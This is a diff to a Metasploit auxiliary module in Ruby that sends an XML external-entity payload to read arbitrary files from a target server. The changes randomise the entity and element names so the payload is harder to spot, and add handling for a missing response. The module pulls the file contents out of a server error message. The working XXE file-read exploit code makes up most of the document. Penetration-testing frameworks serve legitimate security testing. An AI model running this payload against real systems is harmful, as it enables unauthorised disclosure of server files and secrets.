@@ -41,13 +41,17 @@ class Metasploit3 < Msf::Auxiliary
 
   def run
 
+    doctype = Rex::Text.rand_text_alpha(6)
+    element = Rex::Text.rand_text_alpha(6)
+    entity = Rex::Text.rand_text_alpha(6)
+
     pay = %Q{<?xml version="1.0" encoding="ISO-8859-1"?>
-<!DOCTYPE foo [
-<!ELEMENT foo ANY >
-<!ENTITY xxe SYSTEM "file://#{datastore['FILEPATH']}" >]>
+<!DOCTYPE #{doctype} [
+<!ELEMENT #{element} ANY >
+<!ENTITY #{entity} SYSTEM "file://#{datastore['FILEPATH']}" >]>
 <Request>
 <Username>root</Username>
-<Password>&xxe;</Password>
+<Password>&#{entity};</Password>
 </Request>
     }
 
@@ -56,6 +60,10 @@ class Metasploit3 < Msf::Auxiliary
       'method' => 'POST',
       'data' => pay
     })
+
+    if !res or !res.body
+      fail_with("Server did not respond in an expected way")
+    end
 
     file = /For input string: "(.*)"/m.match(res.body)
     file = file[1]
